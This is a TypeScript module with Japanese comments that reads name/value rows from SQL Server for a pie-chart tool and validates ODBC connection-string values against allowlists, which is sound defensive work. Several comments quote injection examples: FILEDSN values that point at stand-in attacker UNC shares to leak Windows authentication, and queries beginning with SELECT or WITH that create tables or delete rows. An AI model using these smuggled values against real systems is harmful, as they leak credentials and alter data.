// =============================================================================
// input/db.ts — SQL Server に SELECT を投げ 2 列(name, value)を読み込む
// -----------------------------------------------------------------------------
// 仕様:
//   - 入力は 1 本の読み取りクエリ。**読み取り専用の強制は DB 側の責務**で、本ファイルの
//     `assertLooksLikeSelect` は指定ミスを早く見つけるための形式チェックにすぎない
//     (理由は同関数の doc)。接続に使うアカウントは `db_datareader` だけを持つ読み取り
//     専用ログインにすること。
//   - 接続文字列に入る値(driver / server / database / extra)は許可リストで検証する。
//     ODBC 接続文字列は `;` 区切りの key=value 列で、値の中の `;` はそのまま新しい
//     キーワードの開始になる(`FILEDSN=\\attacker\share\a.dsn` の注入で統合認証の
//     チャレンジレスポンスが外へ出る)。
//   - 列解決は `load.ts` の xlsx 経路と同じ思想: `nameColumn`/`valueColumn` 指定時は列名で、
//     無指定時は結果セットの先頭 2 列を name/value とみなす(3 列以上はあいまいなので拒否)。
//   - name 空欄・value 数値変換不可は明示エラー、name/value とも空の行はスキップ。
// 接続は editor フェーズ2(`editor/server/src/db/pool.ts`)と同じ msnodesqlv8 +
// ODBC `Trusted_Connection=yes`(Windows 統合認証)パターンを踏襲する。ネイティブな
// optionalDependency のため `createRequire` で**遅延ロード**し、ドライバが無い環境でも
// 他入力(sample/json/xlsx)と `tsc` は動く。レンダリング層の外部依存ゼロ方針は不変で、
// DB 依存は本ファイルに隔離する(input/load.ts の xlsx 節と同列の入力層)。
// =============================================================================

import { createRequire } from 'node:module';

import { MAX_DB_ROWS } from '../limits.js';
import { isSea } from '../runtime/seaRuntime.js';

// 通常の ESM(tsx)では `require` が無いので createRequire で作る。SEA(esbuild の cjs
// バンドル)の ambient `require` は **builtin 専用**で `msnodesqlv8` を解決できないが、
// `loadDbItems` 冒頭の `isSea()` ガードがそこへ到達させない(exe 版は DB 入力非対応)。
const requireCjs: NodeRequire =
  typeof require === 'function' ? require : createRequire(import.meta.url);

/** msnodesqlv8 のトップレベル one-shot API のうち本ローダが使う部分だけを型付け。 */
interface MsSql {
  query: (
    connectionString: string,
    sql: string,
    params: unknown[],
    cb: (err: unknown, rows: Record<string, unknown>[]) => void,
  ) => void;
}

interface LoadDbOpts {
  /** 読み取りクエリ(1 本)。書き込みを防ぐのは接続アカウントの権限であって本文字列の検査ではない。 */
  query: string;
  /** 接続先サーバ。未指定は env `DB_SERVER`、既定 `localhost`。 */
  server?: string;
  /** データベース名。未指定は env `DB_NAME`(これも無ければエラー)。 */
  database?: string;
  /** ODBC ドライバ名。未指定は env `DB_ODBC_DRIVER`、既定 `ODBC Driver 17 for SQL Server`。 */
  driver?: string;
  /** name 列の列名(指定時は valueColumn も必須)。無指定なら先頭 2 列を使う。 */
  nameColumn?: string;
  /** value 列の列名(指定時は nameColumn も必須)。 */
  valueColumn?: string;
  /**
   * 追加の接続文字列断片。未指定は env `DB_CONN_EXTRA`。自由記述ではなく
   * `EXTRA_KEYWORDS` の許可リストに載ったキーワードだけを `key=value;` で並べる。
   */
  extra?: string;
}

// ── 1. 接続文字列(値はすべて許可リスト) ──────────────────────────────────────

/**
 * 受け入れる ODBC ドライバ名。**完全一致の集合メンバシップ**で、`startsWith` や
 * 「`for SQL Server` を含む」のような述語へ緩めない(緩めた瞬間に `};FILEDSN=...` の
 * ような値が名前の一部として通る)。実在するドライバ名だけを列挙する。
 */
const ALLOWED_ODBC_DRIVERS: ReadonlySet<string> = new Set([
  'ODBC Driver 18 for SQL Server',
  'ODBC Driver 17 for SQL Server',
  'ODBC Driver 13.1 for SQL Server',
  'ODBC Driver 13 for SQL Server',
  'ODBC Driver 11 for SQL Server',
  'SQL Server Native Client 11.0',
  'SQL Server',
]);

/**
 * `Server` の形: `[tcp:]host[\instance][,port]`。host は名前 / IP / `(localdb)`。
 * `;` `{` `}` `=` `\\`(UNC の起点)を 1 文字も含めないことが要点で、これが無いと
 * `localhost;FILEDSN=\\evil\s\x.dsn` がキーワード注入になる。
 */
const SERVER_RE = /^(?:tcp:)?(?:\(localdb\)|[A-Za-z0-9._-]+)(?:\\[A-Za-z0-9._$-]+)?(?:,\d{1,5})?$/;

/** `Database` の形: SQL Server の通常識別子相当(先頭は文字か `_`)。 */
const DATABASE_RE = /^[\p{L}_][\p{L}\p{N}_$#-]{0,127}$/u;

/**
 * `extra` に置けるキーワードと、その値の形。自由記述の追記口を残すと接続文字列の
 * 組み立て全体が無意味になるため、**必要なものだけ**をここへ足す方式に縮退させている。
 * キーの照合は大小無視で、出力は正規形(このマップのキー)で書き直す。
 */
const EXTRA_KEYWORDS: ReadonlyMap<string, RegExp> = new Map([
  ['Encrypt', /^(?:yes|no|mandatory|optional|strict)$/i],
  ['TrustServerCertificate', /^(?:yes|no)$/i],
  ['ApplicationIntent', /^(?:ReadOnly|ReadWrite)$/i],
  ['MultiSubnetFailover', /^(?:yes|no)$/i],
  ['Connection Timeout', /^\d{1,4}$/],
  ['Login Timeout', /^\d{1,4}$/],
]);

/**
 * ODBC の接続文字列文法で値を波括弧で囲えるのは **`DRIVER` キーワードだけ**
 * (`attribute ::= attribute-keyword=attribute-value | DRIVER=[{]attribute-value[}]`)。
 * 規約どおり内部の `}` は `}}` へ二重化する。`Server` / `Database` を同じように囲むと
 * ドライバは括弧込みの値として受け取るため、そちらは囲まず上の文字種検査で守る。
 */
function odbcBraceValue(value: string): string {
  const escaped = value.replace(/}/g, '}}');
  return `{${escaped}}`;
}

/** `extra` を許可リストで検証し、正規形の `key=value;` 列へ組み直す。 */
export function normalizeConnExtra(extra: string): string {
  const parts = extra
    .split(';')
    .map((part) => part.trim())
    .filter((part) => part !== '');
  const canonicalKeys = new Map([...EXTRA_KEYWORDS.keys()].map((key) => [key.toLowerCase(), key]));
  return parts
    .map((part) => {
      const eq = part.indexOf('=');
      if (eq <= 0) {
        throw new Error(`Invalid connection extra fragment: "${part}" (expected "key=value").`);
      }
      const rawKey = part.slice(0, eq).trim();
      const value = part.slice(eq + 1).trim();
      const key = canonicalKeys.get(rawKey.toLowerCase());
      if (key === undefined) {
        throw new Error(
          `Connection keyword "${rawKey}" is not allowed ` +
            `(allowed: ${[...EXTRA_KEYWORDS.keys()].join(', ')}).`,
        );
      }
      if (!EXTRA_KEYWORDS.get(key)!.test(value)) {
        throw new Error(`Invalid value for connection keyword "${key}": "${value}".`);
      }
      return `${key}=${value};`;
    })
    .join('');
}

/**
 * editor の `config.db.connectionString` と同形の ODBC 接続文字列を組み立てる。
 * 認証は Windows 統合認証固定(`Trusted_Connection=yes`)で資格情報は持たない。
 * 値の出所は CLI フラグと環境変数(= 呼び出し側の入力)なので、連結する前にすべて
 * 許可リストへ通す — ここが接続文字列を作る唯一の場所で、検査の置き場所でもある。
 */
export function buildConnectionString(opts: LoadDbOpts): string {
  const driver = opts.driver ?? process.env.DB_ODBC_DRIVER ?? 'ODBC Driver 17 for SQL Server';
  if (!ALLOWED_ODBC_DRIVERS.has(driver)) {
    throw new Error(
      `Unknown ODBC driver: "${driver}" (allowed: ${[...ALLOWED_ODBC_DRIVERS].join(' / ')}).`,
    );
  }
  const server = opts.server ?? process.env.DB_SERVER ?? 'localhost';
  if (!SERVER_RE.test(server)) {
    throw new Error(`Invalid server: "${server}" (expected host[\\instance][,port]).`);
  }
  const database = opts.database ?? process.env.DB_NAME;
  if (!database) {
    throw new Error('database is required (pass --db-name or set DB_NAME).');
  }
  if (!DATABASE_RE.test(database)) {
    throw new Error(`Invalid database name: "${database}".`);
  }
  const extra = normalizeConnExtra(opts.extra ?? process.env.DB_CONN_EXTRA ?? '');
  return `Driver=${odbcBraceValue(driver)};Server=${server};Database=${database};Trusted_Connection=yes;${extra}`;
}

// ── 2. クエリの形式チェック(権限の境界ではない) ────────────────────────────

/**
 * 指定ミス(空文字・更新文の貼り付け)を早く見つけるための**形式チェック**。
 *
 * **これは読み取り専用の強制ではない。** 文字列パターンで T-SQL の読み取り専用性は
 * 強制できないため、その主張は取り下げてある:
 *   - `SELECT * INTO dbo.evil FROM sys.objects` は先頭が SELECT のままテーブルを作る。
 *   - `WITH c AS (SELECT 1 a) DELETE FROM dbo.t` は先頭が WITH のまま DML を実行する。
 *   - T-SQL は文の区切りに `;` を要求しないので、`;` の不在は単文であることを意味しない。
 *   - `SELECT * FROM (<query>) q` のような包み込みも、閉じ括弧 + 後続文で抜けられる。
 * 書き込みを防ぐのは**接続アカウントの権限**(`db_datareader` だけを持つ読み取り専用
 * ログイン)で、pie-chart 側にその境界は無い。README「DB(SQL Server)入力の決まり」も同旨。
 */
export function assertLooksLikeSelect(query: string): void {
  const trimmed = query.trim().replace(/;\s*$/, '').trim();
  if (trimmed === '') {
    throw new Error('Query is empty.');
  }
  if (trimmed.includes(';')) {
    throw new Error('Query looks like multiple statements (embedded ";"); pass a single query.');
  }
  if (!/^(select|with)\b/i.test(trimmed)) {
    throw new Error('Query must start with SELECT or WITH (this is a typo check, not a boundary).');
  }
}

// ── 3. 結果セットの解決と読み出し ──────────────────────────────────────────

/**
 * 数値として読めなければ null。`load.ts` の `cellAsNumber`(xlsx 経路)と同じ規則で、
 * カンマは桁区切りとして成立する位置にある時だけ許容する。判定を共有しないのは
 * `load.ts` が本ファイルを import しており、逆向きの import が循環になるため。
 * 規則を変えるときは両方を揃える。
 */
const GROUPED_NUMBER_RE = /^[+-]?\d{1,3}(?:,\d{3})+(?:\.\d+)?$/;

function toNumber(v: unknown): number | null {
  if (v == null || v === '') return null;
  if (typeof v === 'number') return Number.isFinite(v) ? v : null;
  const text = String(v).trim();
  const normalized = GROUPED_NUMBER_RE.test(text) ? text.replace(/,/g, '') : text;
  if (normalized.includes(',')) return null;
  const n = Number(normalized);
  return Number.isFinite(n) ? n : null;
}

/**
 * 結果セット(行オブジェクト配列)から name/value 2 列を解決し `[name, value][]` を返す。
 * 戻り値は `load.ts` の `normalizeInputItems` で `{name, value}` に整形される。
 */
export function rowsToItems(
  rows: Record<string, unknown>[],
  nameColumn?: string,
  valueColumn?: string,
): Array<[string, number]> {
  if (rows.length === 0) {
    throw new Error('Query returned no rows.');
  }
  // 行 → 項目の変換に入る前に行数で切る(理由と射程は `limits.ts` の `MAX_DB_ROWS`)。
  if (rows.length > MAX_DB_ROWS) {
    throw new Error(
      `Query returned ${rows.length} rows (limit ${MAX_DB_ROWS}). ` +
        'Aggregate in SQL (GROUP BY / TOP) so the query returns one row per slice, ' +
        'or raise the limit with PIE_MAX_DB_ROWS=<n>.',
    );
  }
  const cols = Object.keys(rows[0]);

  let nameKey: string;
  let valueKey: string;
  if (nameColumn !== undefined || valueColumn !== undefined) {
    if (nameColumn === undefined || valueColumn === undefined) {
      throw new Error('Specify both name and value columns, or neither.');
    }
    if (!cols.includes(nameColumn)) {
      throw new Error(`Name column not found: "${nameColumn}" (available: ${cols.join(', ')}).`);
    }
    if (!cols.includes(valueColumn)) {
      throw new Error(`Value column not found: "${valueColumn}" (available: ${cols.join(', ')}).`);
    }
    nameKey = nameColumn;
    valueKey = valueColumn;
  } else {
    if (cols.length < 2) {
      throw new Error('Query must return at least 2 columns (name, value).');
    }
    if (cols.length > 2) {
      throw new Error(
        `Query returned ${cols.length} columns; specify name/value columns to disambiguate ` +
          `(available: ${cols.join(', ')}).`,
      );
    }
    [nameKey, valueKey] = cols;
  }

  const items: Array<[string, number]> = [];
  for (let i = 0; i < rows.length; i += 1) {
    const row = rows[i];
    const nameRaw = row[nameKey];
    const valueRaw = row[valueKey];
    const name = nameRaw == null ? '' : String(nameRaw).trim();
    const valueIsBlank = valueRaw == null || valueRaw === '';

    if (!name && valueIsBlank) continue;
    if (!name) throw new Error(`Empty name at row ${i + 1}.`);
    const value = toNumber(valueRaw);
    if (value == null) {
      throw new Error(`Non-numeric value at row ${i + 1} (got "${String(valueRaw)}").`);
    }
    items.push([name, value]);
  }
  if (items.length === 0) {
    throw new Error('No usable data rows (all blank).');
  }
  return items;
}

/**
 * SQL Server に SELECT を投げ `[name, value][]` を読み出す。`msnodesqlv8`(ネイティブ
 * optional 依存)を遅延 require し、未導入時は明確なメッセージで失敗する。
 */
export async function loadDbItems(opts: LoadDbOpts): Promise<Array<[string, number]>> {
  // exe 版は DB 入力を非対応とする。ネイティブ `.node` はバンドルできず、外部配置は
  // 「署名の外にあるコードを実行時に読む」ことそのもの(= `runtime/seaRuntime.ts` が閉じた
  // 経路)なので、exe 隣へ msnodesqlv8 を置く運用は復活させない。dev(Node + tsx/CLI)を使う。
  if (isSea()) {
    throw new Error(
      'DB SELECT input (--sql) is not available in the packaged executable. ' +
        'Use the development CLI (Node + tsx) instead.',
    );
  }
  if (!opts.query || !opts.query.trim()) {
    throw new Error('query is required (e.g. "SELECT name, value FROM ...").');
  }
  assertLooksLikeSelect(opts.query);
  const connectionString = buildConnectionString(opts);

  let sql: MsSql;
  try {
    sql = requireCjs('msnodesqlv8') as MsSql;
  } catch {
    throw new Error(
      'msnodesqlv8 is not installed. DB SELECT input needs the native driver ' +
        '(optionalDependency); install it or use a different input source.',
    );
  }

  const rows = await new Promise<Record<string, unknown>[]>((resolve, reject) => {
    sql.query(connectionString, opts.query, [], (err, result) => {
      if (err) reject(err);
      else resolve(result ?? []);
    });
  });
  return rowsToItems(rows, opts.nameColumn, opts.valueColumn);
}
